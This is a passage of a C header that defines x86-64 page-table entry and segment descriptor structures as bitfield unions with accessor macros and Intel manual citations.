#define PDE_64_ACCESSED_FLAG 0x20
#define PDE_64_ACCESSED_MASK 0x01
#define PDE_64_ACCESSED(_) (((_) >> 5) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 7] Page size; must be 0 (otherwise, this entry maps a 2-MByte page).
     */
    UINT64 LargePage : 1;
#define PDE_64_LARGE_PAGE_BIT 7
#define PDE_64_LARGE_PAGE_FLAG 0x80
#define PDE_64_LARGE_PAGE_MASK 0x01
#define PDE_64_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bits 11:8] Ignored.
     */
    UINT64 Ignored1 : 4;
#define PDE_64_IGNORED_1_BIT 8
#define PDE_64_IGNORED_1_FLAG 0xF00
#define PDE_64_IGNORED_1_MASK 0x0F
#define PDE_64_IGNORED_1(_) (((_) >> 8) & 0x0F)

    /**
     * [Bits 47:12] Physical address of 4-KByte aligned page table referenced by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define PDE_64_PAGE_FRAME_NUMBER_BIT 12
#define PDE_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define PDE_64_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define PDE_64_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 4;

    /**
     * [Bits 62:52] Ignored.
     */
    UINT64 Ignored2 : 11;
#define PDE_64_IGNORED_2_BIT 52
#define PDE_64_IGNORED_2_FLAG 0x7FF0000000000000
#define PDE_64_IGNORED_2_MASK 0x7FF
#define PDE_64_IGNORED_2(_) (((_) >> 52) & 0x7FF)

    /**
     * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed
     * from the 2-MByte region controlled by this entry); otherwise, reserved (must be 0).
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 ExecuteDisable : 1;
#define PDE_64_EXECUTE_DISABLE_BIT 63
#define PDE_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PDE_64_EXECUTE_DISABLE_MASK 0x01
#define PDE_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PDE_64;

/**
 * @brief Format of a 4-Level Page-Table Entry that Maps a 4-KByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to map a 4-KByte page.
     */
    UINT64 Present : 1;
#define PTE_64_PRESENT_BIT 0
#define PTE_64_PRESENT_FLAG 0x01
#define PTE_64_PRESENT_MASK 0x01
#define PTE_64_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-KByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Write : 1;
#define PTE_64_WRITE_BIT 1
#define PTE_64_WRITE_FLAG 0x02
#define PTE_64_WRITE_MASK 0x01
#define PTE_64_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-KByte page
     * referenced by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Supervisor : 1;
#define PTE_64_SUPERVISOR_BIT 2
#define PTE_64_SUPERVISOR_FLAG 0x04
#define PTE_64_SUPERVISOR_MASK 0x01
#define PTE_64_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * 4-KByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelWriteThrough : 1;
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * 4-KByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelCacheDisable : 1;
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether software has accessed the 4-KByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Accessed : 1;
#define PTE_64_ACCESSED_BIT 5
#define PTE_64_ACCESSED_FLAG 0x20
#define PTE_64_ACCESSED_MASK 0x01
#define PTE_64_ACCESSED(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Dirty; indicates whether software has written to the 4-KByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Dirty : 1;
#define PTE_64_DIRTY_BIT 6
#define PTE_64_DIRTY_FLAG 0x40
#define PTE_64_DIRTY_MASK 0x01
#define PTE_64_DIRTY(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Indirectly determines the memory type used to access the 4-KByte page referenced by
     * this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 Pat : 1;
#define PTE_64_PAT_BIT 7
#define PTE_64_PAT_FLAG 0x80
#define PTE_64_PAT_MASK 0x01
#define PTE_64_PAT(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored
     * otherwise.
     *
     * @see Vol3A[4.10(Caching Translation Information)]
     */
    UINT64 Global : 1;
#define PTE_64_GLOBAL_BIT 8
#define PTE_64_GLOBAL_FLAG 0x100
#define PTE_64_GLOBAL_MASK 0x01
#define PTE_64_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT64 CopyOnWrite : 1;
    UINT64 Unused : 1;
    UINT64 Write1 : 1;
#define PTE_64_IGNORED_1_BIT 9
#define PTE_64_IGNORED_1_FLAG 0xE00
#define PTE_64_IGNORED_1_MASK 0x07
#define PTE_64_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bits 47:12] Physical address of the 4-KByte page referenced by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define PTE_64_PAGE_FRAME_NUMBER_BIT 12
#define PTE_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define PTE_64_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define PTE_64_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 58:52] Ignored.
     */
    UINT64 Ignored2 : 7;
#define PTE_64_IGNORED_2_BIT 52
#define PTE_64_IGNORED_2_FLAG 0x7F0000000000000
#define PTE_64_IGNORED_2_MASK 0x7F
#define PTE_64_IGNORED_2(_) (((_) >> 52) & 0x7F)

    /**
     * [Bits 62:59] Protection key; if CR4.PKE = 1, determines the protection key of the page;
     * ignored otherwise.
     *
     * @see Vol3A[4.6.2(Protection Keys)]
     */
    UINT64 ProtectionKey : 4;
#define PTE_64_PROTECTION_KEY_BIT 59
#define PTE_64_PROTECTION_KEY_FLAG 0x7800000000000000
#define PTE_64_PROTECTION_KEY_MASK 0x0F
#define PTE_64_PROTECTION_KEY(_) (((_) >> 59) & 0x0F)

    /**
     * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed
     * from the 1-GByte page controlled by this entry); otherwise, reserved (must be 0).
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 ExecuteDisable : 1;
#define PTE_64_EXECUTE_DISABLE_BIT 63
#define PTE_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PTE_64_EXECUTE_DISABLE_MASK 0x01
#define PTE_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PTE_64;

/**
 * @brief Format of a common Page-Table Entry
 */
typedef union {
  struct {
    UINT64 Present : 1;
#define PT_ENTRY_64_PRESENT_BIT 0
#define PT_ENTRY_64_PRESENT_FLAG 0x01
#define PT_ENTRY_64_PRESENT_MASK 0x01
#define PT_ENTRY_64_PRESENT(_) (((_) >> 0) & 0x01)
    UINT64 Write : 1;
#define PT_ENTRY_64_WRITE_BIT 1
#define PT_ENTRY_64_WRITE_FLAG 0x02
#define PT_ENTRY_64_WRITE_MASK 0x01
#define PT_ENTRY_64_WRITE(_) (((_) >> 1) & 0x01)
    UINT64 Supervisor : 1;
#define PT_ENTRY_64_SUPERVISOR_BIT 2
#define PT_ENTRY_64_SUPERVISOR_FLAG 0x04
#define PT_ENTRY_64_SUPERVISOR_MASK 0x01
#define PT_ENTRY_64_SUPERVISOR(_) (((_) >> 2) & 0x01)
    UINT64 PageLevelWriteThrough : 1;
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)
    UINT64 PageLevelCacheDisable : 1;
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)
    UINT64 Accessed : 1;
#define PT_ENTRY_64_ACCESSED_BIT 5
#define PT_ENTRY_64_ACCESSED_FLAG 0x20
#define PT_ENTRY_64_ACCESSED_MASK 0x01
#define PT_ENTRY_64_ACCESSED(_) (((_) >> 5) & 0x01)
    UINT64 Dirty : 1;
#define PT_ENTRY_64_DIRTY_BIT 6
#define PT_ENTRY_64_DIRTY_FLAG 0x40
#define PT_ENTRY_64_DIRTY_MASK 0x01
#define PT_ENTRY_64_DIRTY(_) (((_) >> 6) & 0x01)
    UINT64 LargePage : 1;
#define PT_ENTRY_64_LARGE_PAGE_BIT 7
#define PT_ENTRY_64_LARGE_PAGE_FLAG 0x80
#define PT_ENTRY_64_LARGE_PAGE_MASK 0x01
#define PT_ENTRY_64_LARGE_PAGE(_) (((_) >> 7) & 0x01)
    UINT64 Global : 1;
#define PT_ENTRY_64_GLOBAL_BIT 8
#define PT_ENTRY_64_GLOBAL_FLAG 0x100
#define PT_ENTRY_64_GLOBAL_MASK 0x01
#define PT_ENTRY_64_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT64 Ignored1 : 3;
#define PT_ENTRY_64_IGNORED_1_BIT 9
#define PT_ENTRY_64_IGNORED_1_FLAG 0xE00
#define PT_ENTRY_64_IGNORED_1_MASK 0x07
#define PT_ENTRY_64_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bits 47:12] Physical address of the 4-KByte page referenced by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define PT_ENTRY_64_PAGE_FRAME_NUMBER_BIT 12
#define PT_ENTRY_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define PT_ENTRY_64_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define PT_ENTRY_64_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 58:52] Ignored.
     */
    UINT64 Ignored2 : 7;
#define PT_ENTRY_64_IGNORED_2_BIT 52
#define PT_ENTRY_64_IGNORED_2_FLAG 0x7F0000000000000
#define PT_ENTRY_64_IGNORED_2_MASK 0x7F
#define PT_ENTRY_64_IGNORED_2(_) (((_) >> 52) & 0x7F)
    UINT64 ProtectionKey : 4;
#define PT_ENTRY_64_PROTECTION_KEY_BIT 59
#define PT_ENTRY_64_PROTECTION_KEY_FLAG 0x7800000000000000
#define PT_ENTRY_64_PROTECTION_KEY_MASK 0x0F
#define PT_ENTRY_64_PROTECTION_KEY(_) (((_) >> 59) & 0x0F)
    UINT64 ExecuteDisable : 1;
#define PT_ENTRY_64_EXECUTE_DISABLE_BIT 63
#define PT_ENTRY_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PT_ENTRY_64_EXECUTE_DISABLE_MASK 0x01
#define PT_ENTRY_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PT_ENTRY_64;

/**
 * @defgroup PAGING_STRUCTURES_ENTRY_COUNT_64 \
 *           Paging structures entry counts
 *
 * Paging structures entry counts.
 * @{
 */
#define PML4E_ENTRY_COUNT_64 0x00000200
#define PDPTE_ENTRY_COUNT_64 0x00000200
#define PDE_ENTRY_COUNT_64 0x00000200
#define PTE_ENTRY_COUNT_64 0x00000200
/**
 * @}
 */

/**
 * @}
 */

/**
 * @}
 */

/**
 * @defgroup SEGMENT_DESCRIPTORS \
 *           Segment descriptors
 * @{
 */
/**
 * @brief Pseudo-Descriptor Format (32-bit)
 *
 * @see Vol3A[3.5.1(Segment Descriptor Tables)] (reference)
 */
#pragma pack(push, 1)
typedef struct {
  /**
   * Limit.
   */
  UINT16 Limit;

  /**
   * Base Address.
   */
  UINT32 BaseAddress;
} SEGMENT_DESCRIPTOR_REGISTER_32;
#pragma pack(pop)

/**
 * @brief Pseudo-Descriptor Format (64-bit)
 *
 * @see Vol3A[3.5.1(Segment Descriptor Tables)] (reference)
 */
#pragma pack(push, 1)
typedef struct {
  /**
   * Limit.
   */
  UINT16 Limit;

  /**
   * Base Address.
   */
  UINT64 BaseAddress;
} SEGMENT_DESCRIPTOR_REGISTER_64;
#pragma pack(pop)

/**
 * @brief Segment access rights
 *
 * @see Vol2A[3.2(Instructions (A-L) | LAR-Load Access Rights Byte)] (reference)
 */
typedef union {
  struct {
    UINT32 Reserved1 : 8;

    /**
     * @brief Type field
     *
     * [Bits 11:8] Indicates the segment or gate type and specifies the kinds of access that can be
     * made to the segment and the direction of growth. The interpretation of this field depends on
     * whether the descriptor type flag specifies an application (code or data) descriptor or a
     * system descriptor. The encoding of the type field is different for code, data, and system
     * descriptors.
     *
     * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
     */
    UINT32 Type : 4;
#define SEGMENT_ACCESS_RIGHTS_TYPE_BIT 8
#define SEGMENT_ACCESS_RIGHTS_TYPE_FLAG 0xF00
#define SEGMENT_ACCESS_RIGHTS_TYPE_MASK 0x0F
#define SEGMENT_ACCESS_RIGHTS_TYPE(_) (((_) >> 8) & 0x0F)

    /**
     * @brief S (descriptor type) flag
     *
     * [Bit 12] Specifies whether the segment descriptor is for a system segment (S flag is clear)
     * or a code or data segment (S flag is set).
     */
    UINT32 DescriptorType : 1;
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_BIT 12
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_FLAG 0x1000
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_MASK 0x01
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE(_) (((_) >> 12) & 0x01)

    /**
     * @brief DPL (descriptor privilege level) field
     *
     * [Bits 14:13] Specifies the privilege level of the segment. The privilege level can range from
     * 0 to 3, with 0 being the most privileged level. The DPL is used to control access to the
     * segment. See Section 5.5, "Privilege Levels", for a description of the relationship of the
     * DPL to the CPL of the executing code segment and the RPL of a segment selector.
     */
    UINT32 DescriptorPrivilegeLevel : 2;
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_BIT 13
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_FLAG 0x6000
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_MASK 0x03
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL(_) (((_) >> 13) & 0x03)

    /**
     * @brief P (segment-present) flag
     *
     * [Bit 15] Indicates whether the segment is present in memory (set) or not present (clear). If
     * this flag is clear, the processor generates a segment-not-present exception (\#NP) when a
     * segment selector that points to the segment descriptor is loaded into a segment register.
     * Memory management software can use this flag to control which segments are actually loaded
     * into physical memory at a given time. It offers a control in addition to paging for managing
     * virtual memory.
     */
    UINT32 Present : 1;
#define SEGMENT_ACCESS_RIGHTS_PRESENT_BIT 15
#define SEGMENT_ACCESS_RIGHTS_PRESENT_FLAG 0x8000
#define SEGMENT_ACCESS_RIGHTS_PRESENT_MASK 0x01
#define SEGMENT_ACCESS_RIGHTS_PRESENT(_) (((_) >> 15) & 0x01)
    UINT32 Reserved2 : 4;

    /**
     * @brief Available bit
     *
     * [Bit 20] Bit 20 of the second doubleword of the segment descriptor is available for use by
     * system software.
     */
    UINT32 System : 1;
#define SEGMENT_ACCESS_RIGHTS_SYSTEM_BIT 20
#define SEGMENT_ACCESS_RIGHTS_SYSTEM_FLAG 0x100000
#define SEGMENT_ACCESS_RIGHTS_SYSTEM_MASK 0x01
#define SEGMENT_ACCESS_RIGHTS_SYSTEM(_) (((_) >> 20) & 0x01)

    /**
     * @brief L (64-bit code segment) flag
     *
     * [Bit 21] In IA-32e mode, bit 21 of the second doubleword of the segment descriptor indicates
     * whether a code segment contains native 64-bit code. A value of 1 indicates instructions in
     * this code segment are executed in 64-bit mode. A value of 0 indicates the instructions in
     * this code segment are executed in compatibility mode. If L-bit is set, then D-bit must be
     * cleared. When not in IA-32e mode or for non-code segments, bit 21 is reserved and should
     * always be set to 0.
     */
    UINT32 LongMode : 1;
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE_BIT 21
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE_FLAG 0x200000
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE_MASK 0x01
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE(_) (((_) >> 21) & 0x01)

    /**
     * @brief D/B (default operation size/default stack pointer size and/or upper bound) flag
     *
     * [Bit 22] Performs different functions depending on whether the segment descriptor is an
     * executable code segment, an expand-down data segment, or a stack segment. (This flag should
     * always be set to 1 for 32-bit code and data segments and to 0 for 16-bit code and data
     * segments.)
     * - Executable code segment. The flag is called the D flag and it indicates the default length
     * for effective addresses and operands referenced by instructions in the segment. If the flag
     * is set, 32-bit addresses and 32-bit or 8-bit operands are assumed; if it is clear, 16-bit
     * addresses and 16-bit or 8-bit operands are assumed. The instruction prefix 66H can be used to
     * select an operand size other than the default, and the prefix 67H can be used select an
     * address size other than the default.
     * - Stack segment (data segment pointed to by the SS register). The flag is called the B (big)
     * flag and it specifies the size of the stack pointer used for implicit stack operations (such
     * as pushes, pops, and calls). If the flag is set, a 32-bit stack pointer is used, which is
     * stored in the 32-bit ESP register; if the flag is clear, a 16-bit stack pointer is used,
     * which is stored in the 16- bit SP register. If the stack segment is set up to be an
     * expand-down data segment (described in the next paragraph), the B flag also specifies the
     * upper bound of the stack segment.
     * - Expand-down data segment. The flag is called the B flag and it specifies the upper bound of
     * the segment. If the flag is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is
     * clear, the upper bound is FFFFH (64 KBytes).
     */
    UINT32 DefaultBig : 1;
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_BIT 22
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_FLAG 0x400000
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_MASK 0x01
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG(_) (((_) >> 22) & 0x01)

    /**
     * @brief G (granularity) flag
     *
     * [Bit 23] Determines the scaling of the segment limit field. When the granularity flag is
     * clear, the segment limit is interpreted in byte units; when flag is set, the segment limit is
     * interpreted in 4-KByte units. (This flag does not affect the granularity of the base address;
     * it is always byte granular.) When the granularity flag is set, the twelve least significant
     * bits of an offset are not tested when checking the offset against the segment limit. For
     * example, when the granularity flag is set, a limit of 0 results in valid offsets from 0 to
     * 4095.
     */
    UINT32 Granularity : 1;
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY_BIT 23
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY_FLAG 0x800000
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY_MASK 0x01
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY(_) (((_) >> 23) & 0x01)
    UINT32 Reserved3 : 8;
  };

  UINT32 Flags;
} SEGMENT_ACCESS_RIGHTS;

/**
 * @brief General Segment Descriptor (32-bit)
 *
 * A segment descriptor is a data structure in a GDT or LDT that provides the processor with the
 * size and location of a segment, as well as access control and status information. Segment
 * descriptors are typically created by compilers, linkers, loaders, or the operating system or
 * executive, but not application programs.
 *
 * @see Vol3A[5.2(FIELDS AND FLAGS USED FOR SEGMENT-LEVEL AND PAGE-LEVEL PROTECTION)]
 * @see Vol3A[5.2.1(Code-Segment Descriptor in 64-bit Mode)]
 * @see Vol3A[5.8.3(Call Gates)]
 * @see Vol3A[6.11(IDT DESCRIPTORS)]
 * @see Vol3A[6.14.1(64-Bit Mode IDT)]
 * @see Vol3A[7.2.2(TSS Descriptor)]
 * @see Vol3A[7.2.3(TSS Descriptor in 64-bit mode)]
 * @see Vol3A[7.2.5(Task-Gate Descriptor)]
 * @see Vol3A[3.4.5(Segment Descriptors)] (reference)
 */
typedef struct {
  /**
   * @brief Segment limit field (15:00)
   *
   * Specifies the size of the segment. The processor puts together the two segment limit fields to
   * form a 20-bit value. The processor interprets the segment limit in one of two ways, depending
   * on the setting of the G (granularity) flag:
   * - If the granularity flag is clear, the segment size can range from 1 byte to 1 MByte, in byte
   * increments.
   * - If the granularity flag is set, the segment size can range from 4 KBytes to 4 GBytes, in
   * 4-KByte increments. The processor uses the segment limit in two different ways, depending on
   * whether the segment is an expand-up or an expand-down segment. For expand-up segments, the
   * offset in a logical address can range from 0 to the segment limit. Offsets greater than the
   * segment limit generate general-protection exceptions (\#GP, for all segments other than SS) or
   * stack-fault exceptions (\#SS for the SS segment). For expand-down segments, the segment limit
   * has the reverse function; the offset can range from the segment limit plus 1 to FFFFFFFFH or
   * FFFFH, depending on the setting of the B flag. Offsets less than or equal to the segment limit
   * generate general-protection exceptions or stack-fault exceptions. Decreasing the value in the
   * segment limit field for an expanddown segment allocates new memory at the bottom of the
   * segment's address space, rather than at the top. IA-32 architecture stacks always grow
   * downwards, making this mechanism convenient for expandable stacks.
   *
   * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
   */
  UINT16 SegmentLimitLow;

  /**
   * @brief Base address field (15:00)
   *
   * Defines the location of byte 0 of the segment within the 4-GByte linear address space. The
   * processor puts together the three base address fields to form a single 32-bit value. Segment
   * base addresses should be aligned to 16-byte boundaries. Although 16-byte alignment is not
   * required, this alignment allows programs to maximize performance by aligning code and data on
   * 16-byte boundaries.
   */
  UINT16 BaseAddressLow;
  /**
   * @brief Segment descriptor fields
   */
  union {
    struct {
      /**
       * [Bits 7:0] Base address field (23:16); see description of $BASE_LOW for more details.
       */
      UINT32 BaseAddressMiddle : 8;
#define SEGMENT__BASE_ADDRESS_MIDDLE_BIT 0
#define SEGMENT__BASE_ADDRESS_MIDDLE_FLAG 0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE_MASK 0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE(_) (((_) >> 0) & 0xFF)

      /**
       * @brief Type field
       *
       * [Bits 11:8] Indicates the segment or gate type and specifies the kinds of access that can
       * be made to the segment and the direction of growth. The interpretation of this field
       * depends on whether the descriptor type flag specifies an application (code or data)
       * descriptor or a system descriptor. The encoding of the type field is different for code,
       * data, and system descriptors.
       *
       * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
       */
      UINT32 Type : 4;
#define SEGMENT__TYPE_BIT 8
#define SEGMENT__TYPE_FLAG 0xF00
#define SEGMENT__TYPE_MASK 0x0F
#define SEGMENT__TYPE(_) (((_) >> 8) & 0x0F)

      /**
       * @brief S (descriptor type) flag
       *
       * [Bit 12] Specifies whether the segment descriptor is for a system segment (S flag is clear)
       * or a code or data segment (S flag is set).
       */
      UINT32 DescriptorType : 1;
#define SEGMENT__DESCRIPTOR_TYPE_BIT 12
#define SEGMENT__DESCRIPTOR_TYPE_FLAG 0x1000
#define SEGMENT__DESCRIPTOR_TYPE_MASK 0x01
#define SEGMENT__DESCRIPTOR_TYPE(_) (((_) >> 12) & 0x01)

      /**
       * @brief DPL (descriptor privilege level) field
       *
       * [Bits 14:13] Specifies the privilege level of the segment. The privilege level can range
       * from 0 to 3, with 0 being the most privileged level. The DPL is used to control access to
       * the segment. See Section 5.5, "Privilege Levels", for a description of the relationship of
       * the DPL to the CPL of the executing code segment and the RPL of a segment selector.
       */
      UINT32 DescriptorPrivilegeLevel : 2;
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_BIT 13
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_FLAG 0x6000
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_MASK 0x03
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL(_) (((_) >> 13) & 0x03)

      /**
       * @brief P (segment-present) flag
       *
       * [Bit 15] Indicates whether the segment is present in memory (set) or not present (clear).
       * If this flag is clear, the processor generates a segment-not-present exception (\#NP) when
       * a segment selector that points to the segment descriptor is loaded into a segment register.
       * Memory management software can use this flag to control which segments are actually loaded
       * into physical memory at a given time. It offers a control in addition to paging for
       * managing virtual memory.
       */
      UINT32 Present : 1;
#define SEGMENT__PRESENT_BIT 15
#define SEGMENT__PRESENT_FLAG 0x8000
#define SEGMENT__PRESENT_MASK 0x01
#define SEGMENT__PRESENT(_) (((_) >> 15) & 0x01)

      /**
       * [Bits 19:16] Segment limit field (19:16); see description of $LIMIT_LOW for more details.
       */
      UINT32 SegmentLimitHigh : 4;
#define SEGMENT__SEGMENT_LIMIT_HIGH_BIT 16
#define SEGMENT__SEGMENT_LIMIT_HIGH_FLAG 0xF0000
#define SEGMENT__SEGMENT_LIMIT_HIGH_MASK 0x0F
#define SEGMENT__SEGMENT_LIMIT_HIGH(_) (((_) >> 16) & 0x0F)

      /**
       * @brief Available bit
       *
       * [Bit 20] Bit 20 of the second doubleword of the segment descriptor is available for use by
       * system software.
       */
      UINT32 System : 1;
#define SEGMENT__SYSTEM_BIT 20
#define SEGMENT__SYSTEM_FLAG 0x100000
#define SEGMENT__SYSTEM_MASK 0x01
#define SEGMENT__SYSTEM(_) (((_) >> 20) & 0x01)

      /**
       * @brief L (64-bit code segment) flag
       *
       * [Bit 21] In IA-32e mode, bit 21 of the second doubleword of the segment descriptor
       * indicates whether a code segment contains native 64-bit code. A value of 1 indicates
       * instructions in this code segment are executed in 64-bit mode. A value of 0 indicates the
       * instructions in this code segment are executed in compatibility mode. If L-bit is set, then
       * D-bit must be cleared. When not in IA-32e mode or for non-code segments, bit 21 is reserved
       * and should always be set to 0.
       */
      UINT32 LongMode : 1;
#define SEGMENT__LONG_MODE_BIT 21
#define SEGMENT__LONG_MODE_FLAG 0x200000
#define SEGMENT__LONG_MODE_MASK 0x01
#define SEGMENT__LONG_MODE(_) (((_) >> 21) & 0x01)

      /**
       * @brief D/B (default operation size/default stack pointer size and/or upper bound) flag
       *
       * [Bit 22] Performs different functions depending on whether the segment descriptor is an
       * executable code segment, an expand-down data segment, or a stack segment. (This flag should
       * always be set to 1 for 32-bit code and data segments and to 0 for 16-bit code and data
       * segments.)
       * - Executable code segment. The flag is called the D flag and it indicates the default
       * length for effective addresses and operands referenced by instructions in the segment. If
       * the flag is set, 32-bit addresses and 32-bit or 8-bit operands are assumed; if it is clear,
       * 16-bit addresses and 16-bit or 8-bit operands are assumed. The instruction prefix 66H can
       * be used to select an operand size other than the default, and the prefix 67H can be used
       * select an address size other than the default.
       * - Stack segment (data segment pointed to by the SS register). The flag is called the B
       * (big) flag and it specifies the size of the stack pointer used for implicit stack
       * operations (such as pushes, pops, and calls). If the flag is set, a 32-bit stack pointer is
       * used, which is stored in the 32-bit ESP register; if the flag is clear, a 16-bit stack
       * pointer is used, which is stored in the 16- bit SP register. If the stack segment is set up
       * to be an expand-down data segment (described in the next paragraph), the B flag also
       * specifies the upper bound of the stack segment.
       * - Expand-down data segment. The flag is called the B flag and it specifies the upper bound
       * of the segment. If the flag is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is
       * clear, the upper bound is FFFFH (64 KBytes).
       */
      UINT32 DefaultBig : 1;
#define SEGMENT__DEFAULT_BIG_BIT 22
#define SEGMENT__DEFAULT_BIG_FLAG 0x400000
#define SEGMENT__DEFAULT_BIG_MASK 0x01
#define SEGMENT__DEFAULT_BIG(_) (((_) >> 22) & 0x01)

      /**
       * @brief G (granularity) flag
       *
       * [Bit 23] Determines the scaling of the segment limit field. When the granularity flag is
       * clear, the segment limit is interpreted in byte units; when flag is set, the segment limit
       * is interpreted in 4-KByte units. (This flag does not affect the granularity of the base
       * address; it is always byte granular.) When the granularity flag is set, the twelve least
       * significant bits of an offset are not tested when checking the offset against the segment
       * limit. For example, when the granularity flag is set, a limit of 0 results in valid offsets
       * from 0 to 4095.
       */
      UINT32 Granularity : 1;
#define SEGMENT__GRANULARITY_BIT 23
